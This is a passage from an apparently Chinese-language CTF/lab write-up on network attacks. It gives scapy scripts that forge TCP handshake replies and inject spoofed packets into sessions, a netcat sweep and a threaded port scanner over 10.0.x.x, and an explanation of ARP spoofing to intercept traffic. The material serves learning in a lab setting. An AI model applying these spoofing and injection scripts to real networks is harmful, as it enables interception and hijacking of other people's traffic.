</code>建立通信（4会发起tcp第三次握手给2），<code>10.0.0.3</code>想要获取他们之间的数据流，那么有两种方式，</p><ul><li><p>一种是<code>10.0.0.3</code>发送arp相应包声称自己的mac地址是.2的mac地址，</p></li><li><p>一种是构造arp相应包，声称<code>10.0.0.2</code>的mac地址是<code>10.0.0.3</code>。（✔这种方式应该是观念上正确的）</p></li></ul><p>这两种都正确吗？在这个场景中，<code>10.0.0.4</code>想要发起tcp三次握手，但他不知道<code>10.0.0.2</code>的mac地址，首先他会发起<code>ARP broadcast</code>询问谁有<code>10.0.0.2</code>的mac地址。</p><ul><li>如果你采用第一种方式，你确实会收到<code>10.0.0.4</code>发来的tcp第一次握手的数据包。但是后续使用<code>scapy</code>构造的tcp第二次握手的应答数据包，却无法发送到<code>10.0.0.4</code>。—<strong>这里不知道为什么</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> TCP<span class="token punctuation">,</span> sr1<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> sniff<span class="token punctuation">,</span> Ether<span class="token punctuation">,</span> send<span class="token punctuation">,</span> sendpmac_2 <span class="token operator">=</span> <span class="token string">"36:11:33:c5:63:50"</span>mac_3 <span class="token operator">=</span> <span class="token string">"ea:5e:73:56:03:6f"</span>mac_4 <span class="token operator">=</span> <span class="token string">"b2:b3:5c:60:01:08"</span><span class="token keyword">def</span> <span class="token function">handle_packet</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span>  <span class="token string">"IP"</span> <span class="token keyword">in</span> packet <span class="token keyword">and</span> <span class="token string">"TCP"</span> <span class="token keyword">in</span> packet<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> packet<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"S"</span><span class="token punctuation">:</span>            ether <span class="token operator">=</span> Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>mac_2<span class="token punctuation">,</span>dst<span class="token operator">=</span>mac_4<span class="token punctuation">)</span>            ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>src<span class="token operator">=</span><span class="token string">"10.0.0.2"</span><span class="token punctuation">,</span>dst<span class="token operator">=</span><span class="token string">"10.0.0.4"</span><span class="token punctuation">)</span>            tcp_ <span class="token operator">=</span> TCP<span class="token punctuation">(</span>seq<span class="token operator">=</span><span class="token number">456132</span><span class="token punctuation">,</span> ack<span class="token operator">=</span>packet<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>seq<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"SA"</span><span class="token punctuation">,</span> dport<span class="token operator">=</span>packet<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">,</span> sport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">)</span>            send_packet <span class="token operator">=</span> ether <span class="token operator">/</span> ip <span class="token operator">/</span> tcp_            send_packet<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>            tcp_3 <span class="token operator">=</span> send<span class="token punctuation">(</span>send_packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span>        <span class="token comment"># 如果有 TCP 负载，打印负载信息</span>        <span class="token keyword">if</span> packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>payload<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Payload: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        sniff<span class="token punctuation">(</span>prn<span class="token operator">=</span>handle_packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>注意<code>ack=(pkt.seq + len(pkt[Raw].payload)</code>。 <code>ack</code>和符号标志位的<code>ACK</code>是不一样的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> TCP<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> sniff<span class="token punctuation">,</span> Ether<span class="token punctuation">,</span> send<span class="token punctuation">,</span> sendp<span class="token punctuation">,</span> Rawmac_2 <span class="token operator">=</span> <span class="token string">"0a:be:cb:0c:2f:c3"</span>mac_3 <span class="token operator">=</span> <span class="token string">"4a:3c:5e:46:45:9e"</span>mac_4 <span class="token operator">=</span> <span class="token string">"7e:2b:6a:5e:37:b0"</span>mac_ <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">handle_packet</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span>  <span class="token string">"IP"</span> <span class="token keyword">in</span> packet <span class="token keyword">and</span> <span class="token string">"TCP"</span> <span class="token keyword">in</span> packet<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span> <span class="token keyword">and</span> packet<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>src <span class="token operator">==</span> <span class="token string">"10.0.0.3"</span> <span class="token keyword">and</span> \        packet<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dst <span class="token operator">==</span> <span class="token string">"10.0.0.4"</span> <span class="token keyword">and</span> packet<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>Raw<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token string">b'COMMANDS:'</span> <span class="token keyword">in</span> packet<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">:</span>        ether <span class="token operator">=</span> Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>mac_2<span class="token punctuation">,</span> dst<span class="token operator">=</span>mac_3<span class="token punctuation">)</span>        ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>src<span class="token operator">=</span><span class="token string">"10.0.0.4"</span><span class="token punctuation">,</span> dst<span class="token operator">=</span><span class="token string">"10.0.0.3"</span><span class="token punctuation">)</span>        tcp_ <span class="token operator">=</span> TCP<span class="token punctuation">(</span>seq<span class="token operator">=</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>ack<span class="token punctuation">,</span> ack<span class="token operator">=</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>seq<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> sport<span class="token operator">=</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">,</span> dport<span class="token operator">=</span>packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">)</span>        payload <span class="token operator">=</span> Raw<span class="token punctuation">(</span><span class="token string">b'FLAG\n'</span><span class="token punctuation">)</span>        send_packet <span class="token operator">=</span>  ip <span class="token operator">/</span> tcp_ <span class="token operator">/</span> payload        sendp<span class="token punctuation">(</span>send_packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span>    <span class="token comment"># 如果有 TCP 负载，打印负载信息</span>    <span class="token keyword">if</span> packet<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span> <span class="token keyword">and</span> packet<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>payload<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>packet<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">inject</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Print packets</span>    <span class="token keyword">if</span>  <span class="token string">"IP"</span> <span class="token keyword">in</span> pkt <span class="token keyword">and</span> <span class="token string">"TCP"</span> <span class="token keyword">in</span> pkt<span class="token punctuation">[</span><span class="token string">"IP"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--- PKT: ---"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"src: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">&#125;</span></span><span class="token string">, dst: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"sport: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">&#125;</span></span><span class="token string">, dport: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"seq: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">.</span>seq<span class="token punctuation">&#125;</span></span><span class="token string">, ack: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">.</span>ack<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flags: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>flags<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Raw <span class="token keyword">in</span> pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"load: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token comment">#pkt[TCP].dport pkt[IP].dst</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                sendp<span class="token punctuation">(</span>Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>pkt<span class="token punctuation">[</span>Ether<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">,</span> dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>Ether<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span> <span class="token operator">/</span> IP<span class="token punctuation">(</span>src<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">,</span>                dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">,</span> dport<span class="token operator">=</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">,</span> seq<span class="token operator">=</span>pkt<span class="token punctuation">.</span>ack<span class="token punctuation">,</span> ack<span class="token operator">=</span><span class="token punctuation">(</span>pkt<span class="token punctuation">.</span>                seq <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"PA"</span><span class="token punctuation">)</span> <span class="token operator">/</span> Raw<span class="token punctuation">(</span>load<span class="token operator">=</span><span class="token string">"FLAG\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span> <span class="token comment"># ack这个步骤没有加上len</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pkt<span class="token punctuation">.</span>time<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>sniff<span class="token punctuation">(</span>prn<span class="token operator">=</span>inject<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>写bash脚本的能力还是要学习一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># !/bin/sh</span><span class="token assign-left variable">subnet</span><span class="token operator">=</span><span class="token string">"10.0.0"</span><span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">31337</span><span class="token keyword">for</span> <span class="token for-or-select variable">ip</span> <span class="token keyword">in</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">..</span><span class="token number">255</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token assign-left variable">target_ip</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$subnet</span>.<span class="token variable">$ip</span>"</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Trying <span class="token variable">$target_ip</span> on port <span class="token variable">$port</span>..."</span>     <span class="token assign-left variable">response</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">nc</span> <span class="token parameter variable">-w</span> <span class="token number">1</span> $target_ip <span class="token number">31337</span><span class="token variable">)</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable">$response</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Connected to <span class="token variable">$target_ip</span>"</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Flag: <span class="token variable">$response</span>"</span>        <span class="token builtin class-name">break</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token comment"># 远程子网和端口</span>subnet <span class="token operator">=</span> <span class="token string">"10.0"</span>port <span class="token operator">=</span> <span class="token number">31337</span>max_threads <span class="token operator">=</span> <span class="token number">100</span>  <span class="token comment"># 最大线程数</span><span class="token comment"># 尝试连接给定的IP和端口</span><span class="token keyword">def</span> <span class="token function">try_connect</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>            s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 设置超时时间为1秒</span>            s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connected to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ip<span class="token punctuation">&#125;</span></span><span class="token string"> on port </span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token comment"># 接收 flag 或响应</span>            response <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>timeout<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ConnectionRefusedError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error connecting to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ip<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 线程池管理</span><span class="token keyword">def</span> <span class="token function">threader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        try_connect<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 构建IP地址池</span><span class="token keyword">def</span> <span class="token function">generate_ips</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">yield</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>subnet<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token comment"># 主函数</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 创建多个线程</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>max_threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>threader<span class="token punctuation">)</span>        t<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># 设置为守护线程</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 将所有IP地址放入队列</span>    <span class="token keyword">for</span> ip <span class="token keyword">in</span> generate_ips<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    <span class="token comment"># 等待所有任务完成</span>    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Scanning complete."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>使用tcpdump将网络数据包保存成<code>test.pcap</code>,再用wireshark打开，查看tcp流的数据就能够得到完成的flag文件了</p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">I don't know enough to speak on real world feasibility/mitigations/etc but I can talk about how the challenge works.`I'm going to assume that when I add the IP, it sends a request to the router, telling it to update its table for what IP is tied to which device.`No request is sent when you configure your IP, you're simply telling your own machine that it should consider itself as 10.0.0.2 and behave accordingly. This means that it will start answering ARP requests and accepting packets for 10.0.0.2.That first part is important. 10.0.0.4 is set up to ARP-query for 10.0.0.2 every second, and since our host now thinks that it has IP address 10.0.0.2, it replies with an is-at. 10.0.0.4 then simply believes our ARP response and redirects its traffic to us.It's important to note that, at least within this challenge, there is no authoritative list of who has which IP address. There is no router. Instead, IPs are simply resolved by asking who has them and trusting that you get a truthful response.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个里面是没有路由器的，但是为什么我发送arp的欺骗包，在这一关中是不起作用的呢？</p><p>如果 <strong>IP 地址 10.0.0.3</strong> 的主机绑定了 <strong>10.0.0.2</strong> 的 IP 地址，而另一台主机 <strong>10.0.0.4</strong> 想与 <strong>10.0.0.2</strong> 建立连接，网络流量的具体走向取决于 ARP 解析过程以及主机和交换机的配置。下面是详细分析：</p><h4 id="1-正常的-ARP-解析流程"><a href="#1-正常的-ARP-解析流程" class="headerlink" title="1. 正常的 ARP 解析流程"></a>1. <strong>正常的 ARP 解析流程</strong></h4><p>在没有 IP 地址冲突或 ARP 欺骗的情况下，当 <strong>10.0.0.4</strong> 想与 <strong>10.0.0.2</strong> 建立连接时，它需要首先通过 ARP（地址解析协议）解析 <strong>10.0.0.2</strong> 的 MAC 地址。这是正常流程的简要说明：</p><ol><li><strong>10.0.0.4</strong> 发送一个 <strong>ARP 请求</strong>，询问网络上 “谁是 10.0.0.2？请告诉我 10.0.0.2 的 MAC 地址。”</li><li>如果网络中有一台主机真正绑定了 <strong>10.0.0.2</strong>（例如原始的 <strong>10.0.0.2</strong> 主机），它会响应这个 ARP 请求，提供自己的 MAC 地址。</li><li><strong>10.0.0.4</strong> 把这个 MAC 地址缓存在自己的 ARP 表中，并使用该 MAC 地址将后续的数据包发送到 <strong>10.0.0.2</strong>。</li></ol><h4 id="2-当-10-0-0-3-绑定了-10-0-0-2"><a href="#2-当-10-0-0-3-绑定了-10-0-0-2" class="headerlink" title="2.当 10.0.0.3 绑定了 10.0.0.2"></a>2.<strong>当 10.0.0.3 绑定了 10.0.0.2</strong></h4><p>现在引入一个特殊情况：<strong>10.0.0.3</strong> 主机绑定了 <strong>10.0.0.2</strong> 的 IP 地址。这意味着 <strong>10.0.0.3</strong> 主机可以响应 ARP 请求，并声称它是 <strong>10.0.0.2</strong>。具体情况将取决于是否发生了 ARP 冲突或者 ARP 欺骗。</p><h4 id="情况-1：ARP-请求被-10-0-0-3-抢先响应"><a href="#情况-1：ARP-请求被-10-0-0-3-抢先响应" class="headerlink" title="情况 1：ARP 请求被 10.0.0.3 抢先响应"></a>情况 1：<strong>ARP 请求被 10.0.0.3 抢先响应</strong></h4><ul><li>如果 <strong>10.0.0.3</strong> 绑定了 <strong>10.0.0.2</strong>，并且抢先响应了 <strong>10.0.0.4</strong> 的 ARP 请求，它会告诉 <strong>10.0.0.4</strong> “我是 10.0.0.2，我的 MAC 地址是 [10.0.0.3 的 MAC 地址]。”</li><li>由于 ARP 是无状态的，只要谁抢先响应，<strong>10.0.0.4</strong> 就会相信这个响应，并将 <strong>10.0.0.2</strong> 对应的 MAC 地址更新为 <strong>10.0.0.3</strong> 的 MAC 地址。</li><li>这样，<strong>10.0.0.4</strong> 后续发送给 <strong>10.0.0.2</strong> 的所有数据包都会发送到 <strong>10.0.0.3</strong>（因为 <strong>10.0.0.4</strong> 的 ARP 表中记录了 <strong>10.0.0.2</strong> 的 MAC 地址实际上是 <strong>10.0.0.3</strong> 的 MAC 地址）。</li></ul><h4 id="情况-2：10-0-0-2-的主机与-10-0-0-3-都响应了-ARP-请求"><a href="#情况-2：10-0-0-2-的主机与-10-0-0-3-都响应了-ARP-请求" class="headerlink" title="情况 2：10.0.0.2 的主机与 10.0.0.3 都响应了 ARP 请求"></a>情况 2：<strong>10.0.0.2 的主机与 10.0.0.3 都响应了 ARP 请求</strong></h4><ul><li><p>如果网络中同时有真正的 <strong>10.0.0.2</strong> 和伪装的 <strong>10.0.0.2</strong>（即 <strong>10.0.0.3</strong> 绑定了 <strong>10.0.0.2</strong>），这就可能引发 <strong>ARP 冲突</strong>。</p></li><li><p>10.0.0.2 和 10.0.0.3 都可能响应 10.0.0.4 的 ARP 请求。此时，结果取决于谁先响应以及交换机或网络的处理方式：</p><ul><li><strong>如果 10.0.0.3 先响应</strong>，则 <strong>10.0.0.4</strong> 可能会认为 <strong>10.0.0.2</strong> 是 <strong>10.0.0.3</strong>，并将数据包发往 <strong>10.0.0.3</strong>。</li><li><strong>如果真正的 10.0.0.2 响应更快</strong>，则 <strong>10.0.0.4</strong> 仍然会向正确的主机发送数据。</li></ul><p>由于 ARP 是动态的，网络中的设备可以随时发送更新的 ARP 响应。因此，ARP 冲突可能会导致通信不稳定，甚至反复切换目标主机。</p></li></ul><h4 id="情况-3：10-0-0-3-主动进行-ARP-欺骗"><a href="#情况-3：10-0-0-3-主动进行-ARP-欺骗" class="headerlink" title="情况 3：10.0.0.3 主动进行 ARP 欺骗"></a>情况 3：<strong>10.0.0.3 主动进行 ARP 欺骗</strong></h4><ul><li>如果 <strong>10.0.0.3</strong> 不仅绑定了 <strong>10.0.0.2</strong>，还主动发送伪造的 <strong>ARP 响应</strong>，欺骗其他主机，使得它们的 ARP 表中记录的 <strong>10.0.0.2</strong> 对应的 MAC 地址是 <strong>10.0.0.3</strong> 的 MAC 地址，这种情况将会导致其他主机（包括 